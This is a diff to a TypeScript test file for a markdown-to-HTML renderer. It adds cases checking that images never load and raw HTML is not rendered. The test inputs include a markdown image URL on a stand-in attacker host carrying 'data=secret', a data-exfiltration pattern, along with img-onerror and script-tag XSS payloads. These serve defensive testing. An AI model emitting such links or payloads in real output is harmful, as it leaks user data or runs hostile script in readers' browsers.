@@ -16,6 +16,8 @@ const cases: [string, string, (html: string) => boolean][] = [
   ['code keeps dollars', 'Run `echo $HOME and $PATH`.', (h) => !h.includes('katex') && h.includes('$HOME')],
   ['file link', 'See [main.ts:3](src/main.ts#L3).', (h) => h.includes('data-href="src/main.ts#L3"')],
   ['bad tex does not throw', 'Oops $\\frac{1}{$ ok', (h) => typeof h === 'string'],
+  ['images never load (shown as links)', 'Look: ![chart](https://evil.example/x.png?data=secret)', (h) => !h.includes('<img') && h.includes('data-href="https://evil.example/x.png?data=secret"')],
+  ['raw HTML is not rendered', 'Hi <img src=x onerror=alert(1)> <script>alert(1)</script>', (h) => !h.includes('<img') && !h.includes('<script')],
   ['built-in \\F \\Q macros', 'Over $\\F_q$ and $\\Q$.', (h) => !h.includes('katex-error') && !h.includes('#cc0000')],
 ];
 
